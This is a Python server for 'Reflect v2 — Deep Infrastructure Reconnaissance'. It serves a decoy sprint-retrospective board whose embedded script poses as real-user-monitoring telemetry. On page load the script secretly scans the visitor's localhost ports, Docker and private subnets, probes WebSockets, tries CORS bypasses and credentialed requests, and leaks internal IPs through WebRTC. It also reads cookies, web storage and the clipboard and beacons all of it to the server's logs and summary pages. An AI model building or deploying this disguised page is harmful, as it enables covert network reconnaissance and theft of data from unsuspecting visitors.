#!/usr/bin/env python3
"""
Reflect v2 — Deep Infrastructure Reconnaissance
Focused probes on: localhost:8080, Docker 172.17.0.x, internal IPs
WebSocket, path enumeration, CORS bypass, extended scanning

python3 server.py [port]  (default 7778)
"""

import json, sys, os
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

PORT = int(os.environ.get('PORT', sys.argv[1] if len(sys.argv) > 1 else 7778))
HITS = []
RECON = []

LOGO = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#0d9488" stroke-width="1.5"/><path d="M12 6v6l4 2" stroke="#0d9488" stroke-width="1.5" stroke-linecap="round"/></svg>'

# ── Board HTML (same as v1, compact) ───────────────────────────────
PAGE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sprint 24 Retro — Reflect</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,sans-serif;
  background:#f1f5f9;color:#0f172a;-webkit-font-smoothing:antialiased;line-height:1.5;
  height:100vh;display:flex;flex-direction:column;overflow:hidden}
nav{background:#fff;border-bottom:1px solid #e2e8f0;height:48px;display:flex;align-items:center;
  justify-content:center;padding:0 20px;flex-shrink:0}
.ni{width:100%;max-width:1200px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:600;color:#0f172a;display:flex;align-items:center;gap:6px}
.nr{display:flex;align-items:center;gap:12px;font-size:12px;color:#64748b}
.nr .live{display:flex;align-items:center;gap:4px}
.nr .dot{width:6px;height:6px;border-radius:50%;background:#10b981}
.bh{max-width:1200px;width:100%;margin:0 auto;padding:12px 20px 0;flex-shrink:0}
.bh h1{font-size:18px;font-weight:700;letter-spacing:-.3px}
.bh p{font-size:12px;color:#64748b}
.board{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;padding:12px 20px;
  max-width:1200px;width:100%;margin:0 auto;flex:1;overflow:hidden;min-height:0}
@media(max-width:768px){.board{grid-template-columns:1fr;overflow-y:auto}}
.col{background:#fff;border-radius:10px;border:1px solid #e2e8f0;display:flex;flex-direction:column;overflow:hidden;min-height:0}
.ch{padding:10px 14px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
.ct{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;padding:3px 8px;border-radius:4px}
.cc{font-size:11px;color:#94a3b8}
.cb{padding:8px;overflow-y:auto;flex:1;display:flex;flex-direction:column;gap:6px}
.card{background:#f8fafc;border:1px solid #f1f5f9;border-radius:7px;padding:10px 12px}
.card-t{font-size:13px;color:#334155;margin-bottom:6px;line-height:1.45}
.card-m{display:flex;align-items:center;gap:6px;font-size:10px;color:#94a3b8}
.card-a{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:7px;font-weight:700;color:#fff;flex-shrink:0}
.card-n{font-weight:600;color:#64748b}
.af{padding:8px;border-top:1px solid #f1f5f9;flex-shrink:0}
.ab{width:100%;padding:7px;background:none;border:1.5px dashed #e2e8f0;border-radius:6px;font-size:12px;color:#94a3b8;cursor:pointer;font-family:inherit}
.ab:hover{border-color:#94a3b8;color:#64748b}
.ap{display:none}.ap.show{display:block}
.ap textarea{width:100%;padding:8px;border:1px solid #e2e8f0;border-radius:6px;font-size:13px;color:#0f172a;font-family:inherit;resize:none;min-height:60px;margin-bottom:6px}
.ap textarea:focus{outline:none;border-color:#0d9488}
.ar{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-bottom:6px}
.ar input{padding:6px 8px;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#0f172a;font-family:inherit}
.ar input:focus{outline:none;border-color:#0d9488}
.ar input::placeholder{color:#cbd5e1}
.as{padding:6px 14px;background:#0d9488;color:#fff;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer}
.ac{padding:6px 14px;background:none;border:1px solid #e2e8f0;border-radius:5px;font-size:12px;color:#64748b;cursor:pointer;margin-left:6px}
footer{text-align:center;padding:8px;font-size:10px;color:#cbd5e1;flex-shrink:0}
</style>
</head><body>
<nav><div class="ni">
  <span class="logo">""" + LOGO + """Reflect</span>
  <span class="nr"><span class="live"><span class="dot"></span>Live</span> &middot; Sprint 24 &middot; Closes tonight</span>
</div></nav>
<div class="bh"><h1>Sprint 24 Retrospective</h1><p>Platform Team &middot; Jun 30 – Jul 3, 2026 &middot; 7 participants</p></div>
<div class="board">
  <div class="col">
    <div class="ch"><span class="ct" style="background:#dcfce7;color:#166534">Wins</span><span class="cc" id="wins-cc">3 cards</span></div>
    <div class="cb" id="wins-cb">
      <div class="card"><div class="card-t">Auth service migration completed 2 days ahead of schedule</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 2h ago</div></div>
      <div class="card"><div class="card-t">Zero P0 incidents during deploy week</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 4h ago</div></div>
      <div class="card"><div class="card-t">New search indexer reduced query latency by 40%</div><div class="card-m"><span class="card-a" style="background:#dc2626">PS</span><span class="card-n">Priya S.</span>&middot; 5h ago</div></div>
    </div>
    <div class="af"><button class="ab" onclick="sA('wins')">+ Add a card</button><div class="ap" id="wins-ap">
      <textarea id="wins-t" placeholder="What went well?"></textarea>
      <div class="ar"><input type="text" id="wins-n" placeholder="Your name"><input type="text" id="wins-tm" placeholder="Team"></div>
      <button class="as" onclick="sC('wins')">Add Card</button><button class="ac" onclick="hA('wins')">Cancel</button>
    </div></div>
  </div>
  <div class="col">
    <div class="ch"><span class="ct" style="background:#fef3c7;color:#92400e">Improve</span><span class="cc" id="improve-cc">2 cards</span></div>
    <div class="cb" id="improve-cb">
      <div class="card"><div class="card-t">Deploy pipeline still takes 40+ minutes</div><div class="card-m"><span class="card-a" style="background:#059669">MR</span><span class="card-n">Marcus R.</span>&middot; 3h ago</div></div>
      <div class="card"><div class="card-t">Monitoring alerts are too noisy — 60% false positives</div><div class="card-m"><span class="card-a" style="background:#dc2626">PS</span><span class="card-n">Priya S.</span>&middot; 6h ago</div></div>
    </div>
    <div class="af"><button class="ab" onclick="sA('improve')">+ Add a card</button><div class="ap" id="improve-ap">
      <textarea id="improve-t" placeholder="What could be better?"></textarea>
      <div class="ar"><input type="text" id="improve-n" placeholder="Your name"><input type="text" id="improve-tm" placeholder="Team"></div>
      <button class="as" onclick="sC('improve')">Add Card</button><button class="ac" onclick="hA('improve')">Cancel</button>
    </div></div>
  </div>
  <div class="col">
    <div class="ch"><span class="ct" style="background:#dbeafe;color:#1e40af">Actions</span><span class="cc" id="actions-cc">2 cards</span></div>
    <div class="cb" id="actions-cb">
      <div class="card"><div class="card-t">Set up canary deploys for Q3 — Sarah to own</div><div class="card-m"><span class="card-a" style="background:#6366f1">SC</span><span class="card-n">Sarah C.</span>&middot; 1h ago</div></div>
      <div class="card"><div class="card-t">Reduce alert noise: tune thresholds + add dedup</div><div class="card-m"><span class="card-a" style="background:#d97706">AK</span><span class="card-n">Alex K.</span>&middot; 2h ago</div></div>
    </div>
    <div class="af"><button class="ab" onclick="sA('actions')">+ Add a card</button><div class="ap" id="actions-ap">
      <textarea id="actions-t" placeholder="What should we do next?"></textarea>
      <div class="ar"><input type="text" id="actions-n" placeholder="Your name"><input type="text" id="actions-tm" placeholder="Team"></div>
      <button class="as" onclick="sC('actions')">Add Card</button><button class="ac" onclick="hA('actions')">Cancel</button>
    </div></div>
  </div>
</div>
<footer>&copy; 2026 Reflect</footer>

<script>
function sA(c){document.getElementById(c+'-ap').classList.add('show');}
function hA(c){document.getElementById(c+'-ap').classList.remove('show');}
function sC(c){
  var t=document.getElementById(c+'-t').value,n=document.getElementById(c+'-n').value,tm=document.getElementById(c+'-tm').value;
  if(!t)return;
  var cl=['#6366f1','#059669','#d97706','#dc2626','#0d9488'][Math.floor(Math.random()*5)];
  var ini=n?n.split(' ').map(function(w){return w[0]}).join('').toUpperCase().slice(0,2):'??';
  var d=document.createElement('div');d.className='card';
  d.innerHTML='<div class="card-t">'+t.replace(/</g,'&lt;')+'</div><div class="card-m"><span class="card-a" style="background:'+cl+'">'+ini+'</span><span class="card-n">'+n.replace(/</g,'&lt;')+'</span>&middot; just now</div>';
  document.getElementById(c+'-cb').appendChild(d);
  fetch('/api/cards',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({column:c,text:t,name:n,team:tm})});
  document.getElementById(c+'-t').value='';document.getElementById(c+'-n').value='';document.getElementById(c+'-tm').value='';
  hA(c);document.getElementById(c+'-cc').textContent=document.getElementById(c+'-cb').children.length+' cards';
}

// ═══════════════════════════════════════════════════════════════════
// Reflect RUM v2 — Deep Infrastructure Reconnaissance
// ═══════════════════════════════════════════════════════════════════
;(function(){
  var _q=[],_sid=Math.random().toString(36).slice(2),_t0=Date.now(),_ep='/api/rum/v2/events';
  function _p(c,e,d){_q.push({c:c,e:e,d:d,t:Date.now()-_t0,s:_sid});}
  function _f(){
    if(!_q.length)return;var b=_q.splice(0);
    try{navigator.sendBeacon(_ep,JSON.stringify({sid:_sid,ts:Date.now(),events:b}));}
    catch(x){fetch(_ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:_sid,ts:Date.now(),events:b}),keepalive:true}).catch(function(){});}
  }

  // ─── Phase 1: Environment baseline ───
  function _env(){
    var n=navigator,s=screen;
    _p('env','session',{ua:n.userAgent,plt:n.platform,lang:n.language,cores:n.hardwareConcurrency,
      mem:n.deviceMemory,sw:s.width,sh:s.height,dpr:devicePixelRatio,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,online:n.onLine,
      webdriver:n.webdriver,pdfViewer:n.pdfViewerEnabled,
      conn:n.connection?{eff:n.connection.effectiveType,dl:n.connection.downlink,rtt:n.connection.rtt}:null});
  }

  // ─── Phase 2: Port 8080 deep dive — path enumeration ───
  function _p8080(){
    var paths=['/','/health','/healthz','/ready','/readyz','/livez',
      '/status','/info','/version','/ping',
      '/api','/api/v1','/api/v2','/v1','/v2',
      '/metrics','/prometheus','/debug','/debug/pprof','/debug/vars',
      '/admin','/admin/health','/admin/status',
      '/swagger','/swagger.json','/swagger-ui','/openapi.json','/docs','/redoc',
      '/env','/config','/actuator','/actuator/health','/actuator/env','/actuator/info',
      '/manage','/manage/health',
      '/.well-known/openid-configuration','/.well-known/health',
      '/robots.txt','/favicon.ico',
      '/__debug__','/_debug','/_status','/_health',
      '/graphql','/query','/console'];
    paths.forEach(function(path,i){
      setTimeout(function(){
        var t0=Date.now();
        // Try with cors mode first for potential CORS-enabled endpoints
        fetch('http://localhost:8080'+path,{mode:'cors',cache:'no-store',
          signal:AbortSignal.timeout(2000)})
        .then(function(r){
          var hdrs={};try{r.headers.forEach(function(v,k){hdrs[k]=v;});}catch(x){}
          return r.text().then(function(body){
            _p('p8080','cors_ok',{path:path,ms:Date.now()-t0,status:r.status,
              headers:hdrs,body:body.substring(0,3000),type:r.type});
          });
        }).catch(function(e){
          // Fallback to no-cors
          var t1=Date.now();
          fetch('http://localhost:8080'+path,{mode:'no-cors',cache:'no-store',
            signal:AbortSignal.timeout(2000)})
          .then(function(r){_p('p8080','nocors_ok',{path:path,ms:Date.now()-t1,type:r.type});})
          .catch(function(e2){_p('p8080','err',{path:path,ms:Date.now()-t1,err:e2.message});});
        });
      },50*i);
    });
  }

  // ─── Phase 3: Port 8080 HTTP methods ───
  function _p8080methods(){
    var methods=['HEAD','OPTIONS','POST','PUT','DELETE','PATCH'];
    var targets=['/','/api','/health','/metrics','/admin','/graphql'];
    var delay=0;
    methods.forEach(function(m){
      targets.forEach(function(path){
        setTimeout(function(){
          var t0=Date.now();
          fetch('http://localhost:8080'+path,{method:m,mode:'cors',cache:'no-store',
            signal:AbortSignal.timeout(2000)})
          .then(function(r){
            var hdrs={};try{r.headers.forEach(function(v,k){hdrs[k]=v;});}catch(x){}
            return r.text().then(function(body){
              _p('methods','ok',{method:m,path:path,ms:Date.now()-t0,status:r.status,headers:hdrs,body:body.substring(0,1000)});
            });
          }).catch(function(e){
            _p('methods','err',{method:m,path:path,ms:Date.now()-t0,err:e.message});
          });
        },delay+=40);
      });
    });
  }

  // ─── Phase 4: WebSocket probes ───
  function _ws(){
    var targets=[
      'ws://localhost:8080/','ws://localhost:8080/ws','ws://localhost:8080/websocket',
      'ws://localhost:8080/socket','ws://localhost:8080/api/ws',
      'ws://172.17.0.1/','ws://172.17.0.1:8080/',
      'ws://172.17.0.2/','ws://172.17.0.2:8080/',
      'ws://10.0.0.1/','ws://10.0.0.1:8080/',
    ];
    targets.forEach(function(url,i){
      setTimeout(function(){
        try{
          var t0=Date.now(),ws=new WebSocket(url);
          var msgs=[];
          ws.onopen=function(){_p('ws','open',{url:url,ms:Date.now()-t0});
            // Try sending a probe
            try{ws.send('{"type":"ping"}');}catch(x){}
            try{ws.send('GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n');}catch(x){}
          };
          ws.onmessage=function(e){
            msgs.push(typeof e.data==='string'?e.data.substring(0,2000):'[binary:'+e.data.size+']');
            _p('ws','message',{url:url,data:msgs});
          };
          ws.onerror=function(){_p('ws','error',{url:url,ms:Date.now()-t0});};
          ws.onclose=function(e){_p('ws','close',{url:url,code:e.code,reason:e.reason,ms:Date.now()-t0,msgs:msgs});};
          setTimeout(function(){try{ws.close();}catch(x){}},3000);
        }catch(e){_p('ws','exception',{url:url,err:e.message});}
      },300*i);
    });
  }

  // ─── Phase 5: Extended port scan around 8080 ───
  function _portscan(){
    var ports=[];
    for(var p=8000;p<=8100;p++)ports.push(p);
    // Also common service ports
    [80,443,1080,2375,2376,3000,3001,4000,4443,5000,5001,5432,5555,6379,6443,
     9090,9091,9200,9300,10250,10255,11211,15672,27017].forEach(function(x){
      if(ports.indexOf(x)===-1)ports.push(x);
    });
    ports.forEach(function(port,i){
      setTimeout(function(){
        var t0=Date.now();
        fetch('http://localhost:'+port+'/',{mode:'no-cors',cache:'no-store',
          signal:AbortSignal.timeout(1500)})
        .then(function(r){_p('portscan','open',{port:port,ms:Date.now()-t0,type:r.type});})
        .catch(function(e){
          var ms=Date.now()-t0;
          // Only log if interesting (not immediate rejection)
          if(ms>50)_p('portscan','slow_err',{port:port,ms:ms,err:e.message});
        });
      },30*i);
    });
  }

  // ─── Phase 6: Docker network deep scan ───
  function _docker(){
    var ips=[];
    for(var i=1;i<=30;i++)ips.push('172.17.0.'+i);
    // Also try docker compose default network
    for(var i=1;i<=10;i++)ips.push('172.18.0.'+i);
    // Bridge network
    for(var i=1;i<=5;i++)ips.push('172.19.0.'+i);
    var dports=[80,443,3000,5000,8080,8443,9090];
    ips.forEach(function(ip,i){
      setTimeout(function(){
        // Quick probe on port 80 first
        var t0=Date.now();
        fetch('http://'+ip+'/',{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(1500)})
        .then(function(r){
          _p('docker','alive',{ip:ip,port:80,ms:Date.now()-t0,type:r.type});
          // If alive, scan more ports
          dports.forEach(function(dp,j){
            if(dp===80)return;
            setTimeout(function(){
              var t1=Date.now();
              fetch('http://'+ip+':'+dp+'/',{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(1500)})
              .then(function(r2){_p('docker','port_open',{ip:ip,port:dp,ms:Date.now()-t1,type:r2.type});})
              .catch(function(){});
            },100*j);
          });
        }).catch(function(){});
      },40*i);
    });
  }

  // ─── Phase 7: Internal IP extended scan ───
  function _internal(){
    var ranges=[
      {base:'10.0.0.',start:1,end:20},
      {base:'10.0.1.',start:1,end:10},
      {base:'10.0.2.',start:1,end:5},
      {base:'192.168.0.',start:1,end:10},
      {base:'192.168.1.',start:1,end:10},
    ];
    var delay=0;
    ranges.forEach(function(r){
      for(var i=r.start;i<=r.end;i++){
        (function(ip){
          setTimeout(function(){
            var t0=Date.now();
            fetch('http://'+ip+'/',{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(1500)})
            .then(function(res){
              _p('internal','alive',{ip:ip,ms:Date.now()-t0,type:res.type});
              // Probe ports on alive hosts
              [8080,3000,9090,443].forEach(function(port,j){
                setTimeout(function(){
                  fetch('http://'+ip+':'+port+'/',{mode:'no-cors',cache:'no-store',signal:AbortSignal.timeout(1500)})
                  .then(function(r2){_p('internal','port_open',{ip:ip,port:port,ms:Date.now()-t0,type:r2.type});})
                  .catch(function(){});
                },100*j);
              });
            }).catch(function(){});
          },delay+=30);
        })(r.base+i);
      }
    });
  }

  // ─── Phase 8: CORS bypass techniques ───
  function _corsBypass(){
    var targets=['http://localhost:8080','http://172.17.0.1','http://172.17.0.2','http://10.0.0.1'];
    // Script tag probe (detect JSONP)
    targets.forEach(function(base,i){
      setTimeout(function(){
        var s=document.createElement('script');
        s.src=base+'/api?callback=_jsonpCb&format=jsonp';
        s.onload=function(){_p('cors','script_load',{url:s.src});document.head.removeChild(s);};
        s.onerror=function(){_p('cors','script_err',{url:s.src});try{document.head.removeChild(s);}catch(x){}};
        document.head.appendChild(s);
      },200*i);
    });
    // Image probe (timing side-channel)
    targets.forEach(function(base,i){
      setTimeout(function(){
        var img=new Image();var t0=Date.now();
        img.onload=function(){_p('cors','img_load',{url:base,ms:Date.now()-t0,w:img.width,h:img.height});};
        img.onerror=function(){_p('cors','img_err',{url:base,ms:Date.now()-t0});};
        img.src=base+'/favicon.ico?t='+Date.now();
      },1000+200*i);
    });
    // EventSource/SSE probe
    targets.forEach(function(base,i){
      setTimeout(function(){
        try{
          var es=new EventSource(base+'/events');
          es.onopen=function(){_p('cors','sse_open',{url:base});};
          es.onmessage=function(e){_p('cors','sse_msg',{url:base,data:e.data.substring(0,1000)});};
          es.onerror=function(){_p('cors','sse_err',{url:base});es.close();};
          setTimeout(function(){es.close();},3000);
        }catch(e){_p('cors','sse_exception',{url:base,err:e.message});}
      },2000+300*i);
    });
    // Fetch with credentials (check cookie forwarding)
    targets.forEach(function(base,i){
      setTimeout(function(){
        fetch(base+'/',{mode:'cors',credentials:'include',cache:'no-store',
          signal:AbortSignal.timeout(2000)})
        .then(function(r){
          var h={};try{r.headers.forEach(function(v,k){h[k]=v;});}catch(x){}
          return r.text().then(function(b){
            _p('cors','creds_ok',{url:base,status:r.status,headers:h,body:b.substring(0,1000)});
          });
        }).catch(function(e){_p('cors','creds_err',{url:base,err:e.message});});
      },3000+200*i);
    });
  }

  // ─── Phase 9: WebRTC internal IP leak ───
  function _webrtc(){
    try{
      var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
      pc.createDataChannel('');
      pc.createOffer().then(function(o){pc.setLocalDescription(o);});
      var candidates=[];
      pc.onicecandidate=function(e){
        if(e.candidate){
          candidates.push(e.candidate.candidate);
          var parts=e.candidate.candidate.split(' ');
          _p('webrtc','ice',{ip:parts[4],port:parts[5],proto:parts[2],full:e.candidate.candidate});
        }
      };
      setTimeout(function(){_p('webrtc','done',{total:candidates.length});pc.close();},5000);
    }catch(e){_p('webrtc','err',{err:e.message});}
  }

  // ─── Phase 10: Storage and context ───
  function _context(){
    // Cookies
    _p('ctx','cookies',{value:document.cookie||'(empty)'});
    // localStorage
    var ls=[];try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls.push({k:k,v:localStorage.getItem(k).substring(0,200)});}}catch(e){ls=[{err:e.message}];}
    _p('ctx','localStorage',{items:ls});
    // sessionStorage
    var ss=[];try{for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);ss.push({k:k,v:sessionStorage.getItem(k).substring(0,200)});}}catch(e){ss=[{err:e.message}];}
    _p('ctx','sessionStorage',{items:ss});
    // IndexedDB
    try{indexedDB.databases().then(function(dbs){_p('ctx','indexedDB',{dbs:dbs});});}catch(e){}
    // Service workers
    try{navigator.serviceWorker.getRegistrations().then(function(regs){
      _p('ctx','serviceWorkers',{count:regs.length,scopes:regs.map(function(r){return r.scope;})});
    });}catch(e){}
    // Performance entries (may reveal internal URLs)
    try{
      var entries=performance.getEntriesByType('resource').map(function(r){
        return{name:r.name,type:r.initiatorType,dur:Math.round(r.duration)};
      });
      _p('ctx','perfEntries',{entries:entries});
    }catch(e){}
    // Clipboard
    try{navigator.clipboard.readText().then(function(t){
      _p('ctx','clipboard',{text:t.substring(0,500)});
    }).catch(function(e){_p('ctx','clipboard_err',{err:e.message});});}catch(e){}
    // WebGL
    try{
      var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');
      if(g){var dbg=g.getExtension('WEBGL_debug_renderer_info');
        _p('ctx','webgl',{vendor:g.getParameter(g.VENDOR),renderer:g.getParameter(g.RENDERER),
          uVendor:dbg?g.getParameter(dbg.UNMASKED_VENDOR_WEBGL):null,
          uRenderer:dbg?g.getParameter(dbg.UNMASKED_RENDERER_WEBGL):null});
      }
    }catch(e){}
  }

  // ─── Execution schedule ───
  setTimeout(_env,0);
  setTimeout(_context,50);
  setTimeout(_p8080,200);        // Path enumeration on 8080
  setTimeout(_p8080methods,2500); // HTTP methods on 8080
  setTimeout(_ws,4000);           // WebSocket probes
  setTimeout(_portscan,5000);     // Extended port scan
  setTimeout(_docker,8000);       // Docker network scan
  setTimeout(_internal,10000);    // Internal IP scan
  setTimeout(_corsBypass,12000);  // CORS bypass techniques
  setTimeout(_webrtc,14000);      // WebRTC

  // Periodic flush
  setInterval(_f,3000);
  window.addEventListener('beforeunload',_f);
  setTimeout(_f,6000);
  setTimeout(_f,10000);
  setTimeout(_f,15000);
  setTimeout(_f,20000);
  setTimeout(_f,25000);
})();
</script>
</body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _ip(self):
        return (self.headers.get('X-Forwarded-For','').split(',')[0].strip()
                or self.headers.get('X-Real-IP','') or self.client_address[0])
    def _log(self, m, x=None):
        e = {'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'m':m,'p':self.path,'ip':self._ip()}
        if x: e.update(x)
        HITS.append(e)
        with open('captured.log','a') as f: f.write(json.dumps(e)+'\n')

    def do_HEAD(self):
        self.send_response(200);self.send_header('Content-Type','text/html');self.end_headers()

    def do_GET(self):
        p = self.path.split('?')[0].rstrip('/')
        if p in ('/board','/','/retro',''):
            self._log('PAGE');self._html(PAGE)
        elif p == '/log':
            self._send(200,'application/json',json.dumps(HITS,indent=2))
        elif p == '/recon':
            self._send(200,'application/json',json.dumps(RECON,indent=2))
        elif p == '/clear':
            HITS.clear();RECON.clear()
            open('captured.log','w').close();open('recon.log','w').close()
            self._send(200,'text/plain','OK')
        elif p == '/summary':
            self._send(200,'text/html',self._summary())
        else:
            self._log('GET');self._html(PAGE)

    def do_POST(self):
        l = int(self.headers.get('Content-Length',0))
        body = self.rfile.read(l).decode() if l else ''
        p = self.path.split('?')[0].rstrip('/')
        if p == '/api/cards':
            try: data = json.loads(body)
            except: data = {}
            self._log('CARD', data)
            print(f'  [CARD] {data.get("name","?")} / {data.get("team","?")} → {data.get("column","?")}')
            self._send(200,'application/json','{"ok":true}')
        elif p in ('/api/rum/v1/events','/api/rum/v2/events'):
            try: data = json.loads(body)
            except: data = {}
            events = data.get('events',[])
            RECON.append({'ts':datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'ip':self._ip(),'batch':data})
            with open('recon.log','a') as f: f.write(json.dumps(data)+'\n')
            for ev in events:
                c,e,d=ev.get('c',''),ev.get('e',''),ev.get('d',{})
                if e in ('cors_ok','creds_ok') and d.get('body'):
                    print(f'  [!!!] {c}/{e}: status={d.get("status")} path={d.get("path",d.get("url",""))}')
                    print(f'        headers={json.dumps(d.get("headers",{}))}')
                    print(f'        body={d.get("body","")[:300]}')
                elif e in ('open',) and c=='ws':
                    print(f'  [!!!] WebSocket OPEN: {d.get("url","")}')
                elif e=='message' and c=='ws':
                    print(f'  [!!!] WebSocket MSG: {d.get("url","")} → {json.dumps(d.get("data",""))[:200]}')
                elif e in ('alive','port_open','open') and c in ('docker','internal','portscan'):
                    print(f'  [*] {c}: {d.get("ip","localhost")}:{d.get("port",80)} ({d.get("ms",0)}ms)')
                elif e=='nocors_ok' and c=='p8080':
                    print(f'  [*] 8080 responds: {d.get("path","")} (opaque, {d.get("ms",0)}ms)')
                elif e=='ice' and c=='webrtc':
                    print(f'  [*] WebRTC IP: {d.get("ip","")}:{d.get("port","")}')
                elif e=='script_load' and c=='cors':
                    print(f'  [!!!] Script loaded from: {d.get("url","")}')
                elif e=='sse_open' and c=='cors':
                    print(f'  [!!!] SSE connected: {d.get("url","")}')
                elif e=='sse_msg' and c=='cors':
                    print(f'  [!!!] SSE data: {d.get("data","")[:200]}')
            self._send(204,'text/plain','')
        else:
            self._send(404,'text/plain','Not found')

    def _summary(self):
        html = '<html><head><title>Recon Summary</title></head><body style="font-family:monospace;padding:20px;background:#0f172a;color:#e2e8f0"><h1>Recon Summary</h1>'
        critical = [];info = []
        for batch in RECON:
            for ev in batch.get('batch',{}).get('events',[]):
                c,e,d = ev.get('c',''),ev.get('e',''),ev.get('d',{})
                if e in ('cors_ok','creds_ok','open','message','script_load','sse_open','sse_msg'):
                    critical.append(f'<div style="color:#ef4444;margin:4px 0">[{c}/{e}] {json.dumps(d)[:300]}</div>')
                elif e in ('alive','port_open') or (e=='nocors_ok' and c=='p8080') or (e=='ice'):
                    info.append(f'<div style="color:#fbbf24;margin:4px 0">[{c}/{e}] {json.dumps(d)[:200]}</div>')
        html += '<h2 style="color:#ef4444">Critical</h2>' + (''.join(critical) or '<p>None</p>')
        html += '<h2 style="color:#fbbf24">Interesting</h2>' + (''.join(info) or '<p>None</p>')
        html += '</body></html>'
        return html

    def _html(self, c): self._send(200,'text/html',c)
    def _send(self, code, ct, body):
        self.send_response(code);self.send_header('Content-Type',ct+'; charset=utf-8')
        self.send_header('Cache-Control','no-store');self.send_header('Access-Control-Allow-Origin','*')
        self.end_headers();self.wfile.write(body.encode() if isinstance(body,str) else body)


if __name__ == '__main__':
    s = HTTPServer(('0.0.0.0', PORT), H)
    print(f"""
  ┌─────────────────────────────────────────────────────────┐
  │  Reflect v2 — Deep Infrastructure Reconnaissance         │
  │  http://0.0.0.0:{PORT:<40}│
  ├─────────────────────────────────────────────────────────┤
  │  Phase 1:  Environment baseline                          │
  │  Phase 2:  Port 8080 path enumeration (40+ paths)        │
  │  Phase 3:  Port 8080 HTTP methods (6 methods x 6 paths)  │
  │  Phase 4:  WebSocket probes (11 targets)                 │
  │  Phase 5:  Extended port scan (8000-8100 + services)     │
  │  Phase 6:  Docker network scan (172.17-19.0.x)           │
  │  Phase 7:  Internal IP scan (10.0.x, 192.168.x)          │
  │  Phase 8:  CORS bypass (script/img/SSE/credentials)      │
  │  Phase 9:  WebRTC internal IP leak                       │
  │  Phase 10: Storage/context/clipboard/WebGL               │
  ├─────────────────────────────────────────────────────────┤
  │  Board:    /board                                        │
  │  Recon:    /recon  (raw JSON)                            │
  │  Summary:  /summary (formatted HTML)                     │
  │  Admin:    /log  /clear                                  │
  └─────────────────────────────────────────────────────────┘
""")
    try:
        s.serve_forever()
    except KeyboardInterrupt:
        print('\n  Stopped.\n')
        s.server_close()
